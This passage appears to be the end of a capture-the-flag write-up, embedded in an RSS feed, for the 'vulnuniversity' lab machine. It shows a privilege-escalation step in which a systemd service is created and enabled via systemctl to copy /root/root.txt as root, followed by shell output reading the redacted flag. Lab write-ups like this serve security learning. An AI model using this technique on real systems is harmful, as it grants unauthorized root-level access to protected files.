&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;TF&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;mktemp&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;.service
echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[Service]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Type=oneshot
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ExecStart=/bin/bash -c &amp;#34;cat /root/root.txt &amp;gt; /tmp/flag&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[Install]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;WantedBy=multi-user.target&amp;#39;&lt;/span&gt; &amp;gt; $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;completed&#34;&gt;Completed&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@vulnuniversity:/$ ls /tmp   
ls /tmp
flag
systemd-private-a88ef9fcca1740df8046c92c2fd10f42-systemd-timesyncd.service-crot11
tmp.vmw8f6efHR
tmp.vmw8f6efHR.service
vriw3SD
www-data@vulnuniversity:/$ cat /tmp/flag       
cat /tmp/flag
flag redacted
www-data@vulnuniversity:/$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
  </channel>
</rss>
